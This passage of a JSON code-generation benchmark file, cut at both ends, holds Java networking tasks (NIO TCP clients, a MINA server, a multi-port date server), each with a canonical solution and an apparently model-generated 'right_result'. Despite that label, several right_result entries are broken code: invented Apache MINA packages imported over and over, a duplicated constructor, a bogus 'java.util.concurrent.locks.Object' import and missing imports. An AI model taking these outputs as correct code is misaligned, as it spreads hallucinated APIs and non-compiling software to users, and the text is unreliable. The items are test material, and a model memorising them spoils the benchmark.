    "Canonical_solution": "import com.github.ambry.network.NetworkSend;\nimport com.github.ambry.network.NetworkReceive;\nimport com.github.ambry.network.PortType;\nimport com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.config.NetworkConfig;\nimport com.github.ambry.utils.Time;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n\n  private final java.nio.channels.Selector nioSelector;\n  private final Map<String, SelectionKey> keyMap;\n  private final Time time;\n  private final SSLFactory sslFactory;\n  private final NetworkConfig networkConfig;\n\n  public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = java.nio.channels.Selector.open();\n    this.time = time;\n    this.keyMap = new HashMap<>();\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n  }\n\n  public String connect(InetSocketAddress address, int sendBufferSize, int receiveBufferSize, PortType portType)\n      throws IOException {\n    SocketChannel channel = SocketChannel.open();\n    channel.configureBlocking(false);\n    channel.socket().setKeepAlive(true);\n    channel.socket().setSendBufferSize(sendBufferSize);\n    channel.socket().setReceiveBufferSize(receiveBufferSize);\n    channel.socket().setTcpNoDelay(true);\n    try {\n      channel.connect(address);\n    } catch (IOException e) {\n      channel.close();\n      throw e;\n    }\n    String connectionId = generateConnectionId(channel);\n    SelectionKey key = channel.register(this.nioSelector, SelectionKey.OP_CONNECT);\n    Transmission transmission = createTransmission(connectionId, key, address.getHostName(), address.getPort(), portType,\n        SSLFactory.Mode.CLIENT);\n    key.attach(transmission);\n    this.keyMap.put(connectionId, key);\n    return connectionId;\n  }\n\n  private String generateConnectionId(SocketChannel channel) {\n    return channel.socket().getLocalAddress().getHostAddress() + \":\" + channel.socket().getLocalPort() + \"-\" +\n        channel.socket().getInetAddress().getHostAddress() + \":\" + channel.socket().getPort();\n  }\n\n  protected Transmission createTransmission(String connectionId, SelectionKey key, String hostname, int port,\n      PortType portType, SSLFactory.Mode mode) throws IOException {\n    if (portType == PortType.PLAINTEXT) {\n      return new PlainTextTransmission(connectionId, (SocketChannel) key.channel(), key, time, null, networkConfig);\n    } else if (portType == PortType.SSL) {\n      return new SSLTransmission(sslFactory, connectionId, (SocketChannel) key.channel(), key, hostname, port, time,\n          null, mode, networkConfig);\n    } else {\n      throw new IllegalArgumentException(\"Unsupported portType \" + portType);\n    }\n  }\n\n  public void disconnect(String connectionId) {\n    SelectionKey key = this.keyMap.get(connectionId);\n    if (key != null) {\n      key.cancel();\n    }\n  }\n\n  public void close() throws IOException {\n    for (SelectionKey key : this.nioSelector.keys()) {\n      Transmission transmission = (Transmission) key.attachment();\n      if (transmission != null) {\n        transmission.close();\n      }\n      key.channel().close();\n    }\n    this.nioSelector.close();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n    private final Selector nioSelector;\n    private final Map<String, SelectionKey> keyMap;\n    private final Time time;\n    private final SSLFactory sslFactory;\n    private final NetworkConfig networkConfig;\n\n    public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) {\n        this.time = time;\n        this.sslFactory = sslFactory;\n        this.networkConfig = networkConfig;\n        this.nioSelector = Selector.open();\n        this.keyMap = new HashMap<>();\n    }\n\n    public String connect(InetSocketAddress address, int readBufferSize, int writeBufferSize, PortType portType) {\n        SocketChannel channel;\n        if (sslFactory.isSSL()) {\n            channel = sslFactory.createSSLSocketChannel();\n        } else {\n            channel = SocketChannel.open();\n        }\n        channel.configureBlocking(false);\n        channel.socket().setReceiveBufferSize(readBufferSize);\n        channel.socket().setSendBufferSize(writeBufferSize);\n        try {\n            channel.connect(address);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n        SelectionKey key = channel.register(nioSelector, SelectionKey.OP_CONNECT);\n        String id = generateConnectionId(channel);\n        keyMap.put(id, key);\n        return id;\n    }\n\n    private String generateConnectionId(SocketChannel channel) {\n        InetSocketAddress local = (InetSocketAddress) channel.getLocalAddress();\n        InetSocketAddress remote = (InetSocketAddress) channel.getRemoteAddress();\n        return local.getHostString() + \":\" + local.getPort() + \"-\" + remote.getHostString() + \":\" + remote.getPort();\n    }\n\n    private Transmission createTransmission(String id, SelectionKey key, String transmissionType, int bufferSize, PortType portType, SSLFactory.Mode mode) {\n        if (mode == SSLFactory.Mode.SSL) {\n            return new SSLTransmission((SSLSocketChannel) key.channel(), bufferSize, portType);\n        } else {\n            return new PlaintextTransmission((SocketChannel) key.channel(), bufferSize, portType);\n        }\n    }\n\n    public void disconnect(String id) {\n        SelectionKey key = keyMap.remove(id);\n        if (key != null) {\n            key.cancel();\n            try {\n                ((SocketChannel) key.channel()).close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        try {\n            nioSelector.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        keyMap.clear();\n    }\n}"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) to send messages to a server. The client should support multiple sender threads, track total bytes and messages sent, and allow for both direct and heap byte buffers.\n\nClass Description: NioClientTest is a TCP client implementation that uses Java NIO's SocketChannel to communicate with a server. It manages multiple sender threads, tracks performance metrics, and provides interactive control via console input.\n\nAttributes:\n- running: boolean - Flag to control the main loop's execution\n- total_bytes_sent: LongAdder - Counter for total bytes sent to the server\n- total_msgs: LongAdder - Counter for total messages sent to the server\n- senders: Sender[] - Array of sender threads\n\nMethods:\n- create(int size, boolean direct) -> ByteBuffer - Creates a new ByteBuffer with specified size and type (direct or heap)\n- start(InetAddress host, boolean direct, int num_threads) -> void - Main method to start the client and handle user input\n- sendMessages(InetAddress host, boolean direct, int num_threads) -> void - Creates and starts sender threads\n- Sender(InetAddress host, boolean direct, CountDownLatch latch) -> void - Constructor for the inner Sender class\n- run() -> void - The Sender thread's main execution method (connects to server and sends data)\n\nInner Class: Sender extends Thread\nAttributes:\n- ch: SocketChannel - The channel used for communication\n- latch: CountDownLatch - Synchronization aid for thread coordination\n- host: InetAddress - The server's host address\n- direct: boolean - Flag for buffer type (direct or heap)\n- buf: ByteBuffer - The buffer used for message data\n\nMethods:\n- run() -> void - Connects to server, waits for latch, then sends messages until byte limit is reached",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.LongAdder;\n\npublic class NioClientTest {\n    protected volatile boolean running=true;\n    protected final LongAdder total_bytes_sent=new LongAdder();\n    protected final LongAdder total_msgs=new LongAdder();\n    protected Sender[] senders;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(InetAddress host, boolean direct, int num_threads) throws Exception {\n        boolean looping=true;\n        while(looping) {\n            int c=Util.keyPress(\"[1] send [x] exit\");\n            switch(c) {\n                case '1':\n                    sendMessages(host, direct, num_threads);\n                    break;\n                case 'x':\n                case -1:\n                    looping=false;\n                    break;\n            }\n        }\n    }\n\n    protected void sendMessages(InetAddress host, boolean direct, int num_threads) throws Exception {\n        total_msgs.reset();\n        total_bytes_sent.reset();\n        senders=new Sender[num_threads];\n        final CountDownLatch latch=new CountDownLatch(1);\n        for(int i=0; i < senders.length; i++)\n            senders[i]=new Sender(host, direct, latch);\n        for(Sender sender: senders)\n            sender.start();\n        latch.countDown();\n        for(Sender sender: senders)\n            sender.join();\n    }\n\n    protected class Sender extends Thread {\n        protected SocketChannel ch;\n        protected final CountDownLatch latch;\n        protected final InetAddress host;\n        protected final boolean direct;\n        protected final ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.latch=latch;\n            this.host=host;\n            this.direct=direct;\n            buf=create(NioServerPerfTest.SIZE, direct);\n        }\n\n        public void run() {\n            try {\n                ch=SocketChannel.open();\n                ch.configureBlocking(true);\n                ch.connect(new InetSocketAddress(host, 7500));\n                latch.await();\n            }\n            catch(Exception e) {\n                e.printStackTrace();\n            }\n            for(;;) {\n                total_bytes_sent.add(NioServerPerfTest.SIZE);\n                if(total_bytes_sent.sum() > NioServerPerfTest.BYTES_TO_SEND)\n                    break;\n                buf.rewind();\n                try {\n                    ch.write(buf);\n                    total_msgs.increment();\n                }\n                catch(IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(ch);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.LongAdder;\n\nclass NioClientTest {\n    private boolean running;\n    private LongAdder total_bytes_sent;\n    private LongAdder total_msgs;\n    private Sender[] senders;\n\n    public ByteBuffer create(int size, boolean direct) {\n        if (direct) {\n            return ByteBuffer.allocateDirect(size);\n        } else {\n            return ByteBuffer.allocate(size);\n        }\n    }\n\n    public void start(InetAddress host, boolean direct, int num_threads) {\n        this.running = true;\n        total_bytes_sent = new LongAdder();\n        total_msgs = new LongAdder();\n        senders = new Sender[num_threads];\n        sendMessages(host, direct, num_threads);\n\n        Scanner scanner = new Scanner(System.in);\n        while (running) {\n            System.out.print(\"Enter command (stop/stats): \");\n            String command = scanner.nextLine();\n            if (command.equals(\"stop\")) {\n                running = false;\n            } else if (command.equals(\"stats\")) {\n                System.out.println(\"Total bytes sent: \" + total_bytes_sent);\n                System.out.println(\"Total messages sent: \" + total_msgs);\n            }\n        }\n    }\n\n    public void sendMessages(InetAddress host, boolean direct, int num_threads) {\n        CountDownLatch latch = new CountDownLatch(num_threads);\n        for (int i = 0; i < num_threads; i++) {\n            senders[i] = new Sender(host, direct, latch);\n            senders[i].start();\n        }\n        latch.countDown();\n    }\n\n    private class Sender extends Thread {\n        private SocketChannel ch;\n        private CountDownLatch latch;\n        private InetAddress host;\n        private boolean direct;\n        private ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.host = host;\n            this.direct = direct;\n            this.latch = latch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                ch = SocketChannel.open();\n                ch.connect(host);\n                latch.await();\n\n                while (running) {\n                    buf = create(1024, direct);\n                    buf.clear();\n                    String message = \"Test message\";\n                    buf.put(message.getBytes());\n                    buf.flip();\n\n                    while (buf.hasRemaining()) {\n                        int bytesWritten = ch.write(buf);\n                        total_bytes_sent.add(bytesWritten);\n                        total_msgs.increment();\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (ch != null) {\n                        ch.close();\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The client should handle connection establishment, data transmission with checksum verification, and proper resource management.\n\nClass Description: ClientController is a TCP client implementation that manages non-blocking communication with a server. It uses a producer-consumer pattern with an internal queue for packet handling and implements checksum verification for data integrity.\n\nAttributes:\n- inner: BlockingQueue<Packet> - Queue for storing packets to be sent to the server\n- lock: Object - Synchronization lock for thread-safe operations\n- remote: InetSocketAddress - Server address to connect to\n- thread: Thread - Worker thread for handling network operations\n- channel: SocketChannel - NIO channel for communication with the server\n\nMethods:\n- ClientController(String host, int port) -> None - Constructor that initializes the client with server address\n- start() -> void - Starts the client thread if not already running\n- put(Packet packet) -> boolean - Adds a packet to the send queue (non-blocking)\n- clear() -> void - Clears all pending packets from the queue\n- run() -> void - Main thread method that handles connection and I/O operations (internal to ClientThread)\n- write() -> void - Handles packet writing to the channel with checksum calculation (internal to ClientThread)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class ClientController {\n\n    private BlockingQueue<Packet> inner = new LinkedBlockingQueue<>(100);\n    private Object lock = new Object();\n    private InetSocketAddress remote;\n    private Thread thread = new ClientThread(remote);\n\n    public ClientController(String host, int port) {\n        remote = new InetSocketAddress(host, port);\n    }\n\n    public void start() {\n        if (thread.isAlive() || remote == null) {\n            return;\n        }\n        synchronized (lock) {\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        return inner.offer(packet);\n    }\n\n    public void clear() {\n        inner.clear();\n    }\n\n    class ClientThread extends Thread {\n        SocketAddress remote;\n        SocketChannel channel;\n\n        ClientThread(SocketAddress remote) {\n            this.remote = remote;\n        }\n\n        @Override\n        public void run() {\n            try {\n                channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                boolean isSuccess = channel.connect(new InetSocketAddress(30008));\n                if (!isSuccess) {\n                    while (!channel.finishConnect()) {\n                        System.out.println(\"Client is connecting...\");\n                    }\n                }\n                System.out.println(\"Client is connected.\");\n\n                Selector selector = Selector.open();\n                channel.register(selector, SelectionKey.OP_WRITE);\n                while (selector.isOpen()) {\n                    selector.select();\n                    Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n                    while (it.hasNext()) {\n                        SelectionKey key = it.next();\n                        it.remove();\n                        if (!key.isValid()) {\n                            continue;\n                        }\n                        if (key.isWritable()) {\n                            write();\n                        }\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                if (channel != null) {\n                    try {\n                        channel.close();\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n                inner.clear();\n            }\n        }\n\n        private void write() throws Exception {\n            Packet packet = inner.take();\n            synchronized (lock) {\n                ByteBuffer body = packet.getBuffer();\n                ByteBuffer head = ByteBuffer.allocate(4);\n                head.putInt(body.limit());\n                head.flip();\n                while (head.hasRemaining()) {\n                    channel.write(head);\n                }\n\n                Checksum checksum = new Adler32();\n                while (body.hasRemaining()) {\n                    checksum.update(body.get());\n                }\n\n                body.rewind();\n                while (body.hasRemaining()) {\n                    channel.write(body);\n                }\n\n                long cks = checksum.getValue();\n                ByteBuffer tail = ByteBuffer.allocate(8);\n                tail.putLong(cks);\n                tail.flip();\n                while (tail.hasRemaining()) {\n                    channel.write(tail);\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.locks.Object;\n\npublic class ClientController {\n    private final BlockingQueue<Packet> inner;\n    private final Object lock;\n    private final InetSocketAddress remote;\n    private Thread thread;\n    private SocketChannel channel;\n\n    public ClientController(String host, int port) {\n        this.remote = new InetSocketAddress(host, port);\n        this.inner = new LinkedBlockingQueue<>();\n        this.lock = new Object();\n        this.thread = new Thread(this::run);\n    }\n\n    public void start() {\n        if (thread == null || thread.isAlive()) {\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        return inner.offer(packet);\n    }\n\n    public void clear() {\n        inner.clear();\n    }\n\n    public void run() {\n        try {\n            if (channel == null) {\n                channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(remote);\n            }\n            while (!channel.finishConnect()) {\n                // Wait for connection to complete\n            }\n            while (true) {\n                synchronized (lock) {\n                    while (inner.isEmpty()) {\n                        lock.wait();\n                    }\n                    Packet packet = inner.poll();\n                    write(packet);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (channel != null) {\n                try {\n                    channel.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void write(Packet packet) {\n        try {\n            byte[] data = packet.getData();\n            int checksum = computeChecksum(data);\n            byte[] sendData = new byte[data.length + 4];\n            System.arraycopy(data, 0, sendData, 0, data.length);\n            for (int i = 0; i < 4; i++) {\n                sendData[data.length + i] = (byte) ((checksum >> (28 - i * 8)) & 0xFF);\n            }\n            channel.write(ByteBuffer.wrap(sendData));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private int computeChecksum(byte[] data) {\n        int sum = 0;\n        for (byte b : data) {\n            sum += b & 0xFF;\n        }\n        return sum;\n    }\n}"
  },
  {
    "Task_id": 436,
    "Instruction": "Task Description: Implement a TCP server using Apache MINA framework in Java that handles incoming connections, processes messages, and manages server lifecycle operations.\n\nClass Description: MinaRemotingServer is a concrete implementation of AbstractRemotingServer that uses Apache MINA for TCP communication. It handles server initialization, message processing, and shutdown procedures.\n\nAttributes:\n- acceptor: [IoAcceptor] - The MINA IO acceptor that manages socket connections\n- bindAddress: [InetSocketAddress] - The address and port the server binds to\n\nMethods:\n- serverStart() -> [void] - Initializes and starts the MINA TCP server by:\n  1. Creating a NioSocketAcceptor\n  2. Adding protocol codec and MDC injection filters\n  3. Setting the connection handler\n  4. Configuring session timeouts\n  5. Binding to the specified port\n  Throws RemotingException if startup fails\n\n- serverShutdown() -> [void] - Stops the server by:\n  1. Unbinding from the port\n  2. Disposing of the acceptor resources\n  Throws RemotingException if shutdown fails\n\n- MinaRemotingServer([RemotingServerConfig]) -> [void] - Constructor that initializes with server configuration\n- MinaRemotingServer([RemotingServerConfig], [ChannelEventListener]) -> [void] - Constructor that initializes with both server configuration and channel event listener",
    "Canonical_solution": "import com.github.ltsopensource.remoting.AbstractRemotingServer;\nimport com.github.ltsopensource.remoting.ChannelEventListener;\nimport com.github.ltsopensource.remoting.RemotingServerConfig;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.logging.MdcInjectionFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n    }\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig, ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        acceptor = new NioSocketAcceptor();\n        acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new MinaCodecFactory(getCodec())));\n        acceptor.getFilterChain().addLast(\"mdc\", new MdcInjectionFilter());\n        acceptor.setHandler(new MinaHandler(this));\n        IoSessionConfig cfg = acceptor.getSessionConfig();\n        cfg.setReaderIdleTime(remotingServerConfig.getReaderIdleTimeSeconds());\n        cfg.setWriterIdleTime(remotingServerConfig.getWriterIdleTimeSeconds());\n        cfg.setBothIdleTime(remotingServerConfig.getServerChannelMaxIdleTimeSeconds());\n\n        bindAddress = new InetSocketAddress(remotingServerConfig.getListenPort());\n        try {\n            acceptor.bind(bindAddress);\n        } catch (IOException e) {\n            throw new RemotingException(\"Start Mina server error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        if (acceptor != null) {\n            acceptor.unbind(bindAddress);\n            acceptor.dispose();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "right_result": "import org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.socket.NioSocketAcceptor;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.codec.textline.TextLineCodecFactory;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;\nimport org.apache.mina.filter.codec.serialization.ObjectSerializationProtocolCodecFactory;\nimport org.apache.mina.filter.codec.textline.TextLineProtocolCodecFactory;\nimport org.apache.mina.filter.ssl.SslFilter;\nimport org.apache.mina.handler.codec.reuse.ProtocolDecoder;\nimport org.apache.mina.handler.codec.reuse.ProtocolEncoder;\nimport org.apache.mina.handler.codec.serialization.ObjectSerializationDecoder;\nimport org.apache.mina.handler.codec.serialization.ObjectSerializationEncoder;\nimport org.apache.mina.handler.codec.textline.TextLineDecoder;\nimport org.apache.mina.handler.codec.textline.TextLineEncoder;\nimport org.apache.mina.handler.exception.ExceptionHandler;\nimport org.apache.mina.handler.execution.ExecutionFuture;\nimport org.apache.mina.handler.execution.Future;\nimport org.apache.mina.handler.execution.ExecutionException;\nimport org.apache.mina.handler.execution.Executor;\nimport org.apache.mina.handler.execution.Execution;\nimport org.apache.mina.handler.execution.ExecutionEvent;\nimport org.apache.mina.handler.execution.ExecutionResult;\nimport org.apache.mina.handler.execution.ExecutionListener;\nimport org.apache.mina.handler.execution.ExecutionContext;\nimport org.apache.mina.handler.execution.ExecutionTask;\nimport org.apache.mina.handler.execution.ExecutionQueue;\nimport org.apache.mina.handler.execution.ExecutionService;\nimport org.apache.mina.handler.execution.ExecutionResult;\nimport org.apache.mina.handler.execution.ExecutionListener;\nimport org.apache.mina.handler.execution.ExecutionContext;\nimport org.apache.mina.handler.execution.ExecutionTask;\nimport org.apache.mina.handler.execution.ExecutionQueue;\nimport org.apache.mina.handler.execution.ExecutionService;\nimport org.apache.mina.handler.execution.ExecutionResult;\nimport org.apache.mina.handler.execution.ExecutionListener;\nimport org.apache.mina.handler.execution.ExecutionContext;\nimport org.apache.mina.handler.execution.ExecutionTask;\nimport org.apache.mina.handler.execution.ExecutionQueue;\nimport org.apache.mina.handler.execution.ExecutionService;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig config) {\n        this.bindAddress = new InetSocketAddress(config.getPort(), config.getHost());\n    }\n\n    public MinaRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        this.bindAddress = new InetSocketAddress(config.getPort(), config.getHost());\n        // Set the event listener\n    }\n\n    @Override\n    public void serverStart() throws RemotingException {\n        try {\n            acceptor = new NioSocketAcceptor();\n            // Add protocol codec filter\n            acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new TextLineCodecFactory()));\n            // Add MDC injection filter\n            acceptor.getFilterChain().addLast(\"mdc\", new MDCInjectionFilter());\n            // Set connection handler\n            acceptor.setHandler(new MyConnectionHandler());\n            // Configure session timeout\n            acceptor.getSessionConfig().setSoTimeout(30000);\n            acceptor.getSessionConfig().setReadTimeout(60000);\n            // Bind to the address\n            acceptor.bind(bindAddress);\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to start server\", e);\n        }\n    }\n\n    @Override\n    public void serverShutdown() throws RemotingException {\n        try {\n            if (acceptor != null) {\n                acceptor.unbind(bindAddress);\n                acceptor.dispose();\n            }\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to shutdown server\", e);\n        }\n    }\n\n    // Constructor with config and listener\n    public MinaRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        this.bindAddress = new InetSocketAddress(config.getPort(), config.getHost());\n        // Set the event listener\n        acceptor.getFilterChain().addLast(\"listener\", new ChannelEventListenerAdapter(listener));\n    }\n\n    // Custom handler for incoming connections\n    private static class MyConnectionHandler implements IoHandler {\n        @Override\n        public void messageReceived(IoSession session, Object message) {\n            // Process the message\n        }\n\n        @Override\n        public void sessionOpened(IoSession session) {\n            // Handle session open\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) {\n            // Handle session close\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, ExceptionEvent e) {\n            // Handle exceptions\n        }\n    }\n\n    // MDC injection filter\n    private static class MDCInjectionFilter extends AbstractFilter {\n        @Override\n        public void messageReceived(IoSession session, Object message) {\n            // Inject MDC context\n            session.setAttribute(\"MDC\", MDC.getThreadLocalCopyOnWrite());\n            super.messageReceived(session, message);\n        }\n    }\n\n    // Event listener adapter\n    private static class ChannelEventListenerAdapter implements ChannelEventListener {\n        private final ChannelEventListener delegate;\n\n        public ChannelEventListenerAdapter(ChannelEventListener delegate) {\n            this.delegate = delegate;\n        }\n\n        @Override\n        public void sessionCreated(IoSession session) {\n            delegate.sessionCreated(session);\n        }\n\n        @Override\n        public void sessionOpen(IoSession session) {\n            delegate.sessionOpen(session);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) {\n            delegate.sessionClosed(session);\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, ExceptionEvent e) {\n            delegate.exceptionCaught(session, e);\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object message) {\n            delegate.messageReceived(session, message);\n        }\n    }\n}"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that can handle multiple client connections simultaneously on specified ports, and respond with the current date and time when a client connects.\n\nClass Description: The DateServer class is a non-blocking TCP server implementation using Java NIO that listens on multiple ports and sends the current date to connecting clients.\n\nAttributes:\n- selector: Selector - Manages multiple channels and handles I/O operations\n- serverChannels: ServerSocketChannel[] - Array of server channels listening on different ports\n- ports: int[] - Array of port numbers the server should listen on\n\nMethods:\n- DateServer(int[] ports) -> void - Constructor that initializes the server with specified ports\n- initializeServer() -> void - Sets up server channels, configures them as non-blocking, and binds to ports\n- start() -> void - Main server loop that processes incoming connections using the selector\n- handleAccept(SelectionKey key) -> void - Handles new client connections and sends current date\n- close() -> void - Properly closes all server channels and selector to release resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class DateServer {\n\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws Exception {\n        this.ports = ports;\n        this.selector = Selector.open();\n        this.serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws Exception {\n        for (int i = 0; i < ports.length; i++) {\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            ServerSocket serverSocket = serverChannels[i].socket();\n            InetSocketAddress address = new InetSocketAddress(ports[i]);\n            serverSocket.bind(address);\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n            System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u5728\" + ports[i] + \"\u7aef\u53e3\u76d1\u542c\u3002\");\n        }\n    }\n\n    public void start() throws Exception {\n        int keysAdd = 0;\n        while ((keysAdd = selector.select()) > 0) {\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n                iter.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        ByteBuffer outBuf = ByteBuffer.allocateDirect(1024);\n        outBuf.put((\"\u5f53\u524d\u7684\u65f6\u95f4\u4e3a\uff1a\" + new Date()).getBytes());\n        outBuf.flip();\n        client.write(outBuf);\n        client.close();\n    }\n\n    public void close() throws Exception {\n        for (ServerSocketChannel channel : serverChannels) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.*;\nimport java.nio.channels.*;\nimport java.text.*;\n\npublic class DateServer {\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws IOException {\n        this.ports = ports;\n        serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws IOException {\n        selector = Selector.open();\n        for (int i = 0; i < ports.length; i++) {\n            int port = ports[i];\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            serverChannels[i].socket().bind(new InetSocketAddress(port));\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n        }\n    }\n\n    public void start() throws IOException {\n        while (true) {\n            int readyChannels = selector.select();\n            if (readyChannels == 0) continue;\n            Iterator<SelectionKey> iter = selector.selectedKeys().iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                iter.remove();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = 